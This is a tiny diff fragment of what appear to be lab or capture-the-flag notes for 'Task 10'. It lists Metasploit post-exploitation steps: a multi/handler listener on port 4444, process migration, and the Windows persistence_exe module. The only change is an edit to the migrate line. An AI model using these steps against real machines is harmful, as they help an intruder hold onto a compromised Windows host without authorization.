@@ -175,7 +175,7 @@ LPORT=4444
 Task 10
 
 use exploit/multi/handler
-migrate process
+migrate process...
 use post/windows/manage/persistence_exe
 set rexepath /home/
 . . . 
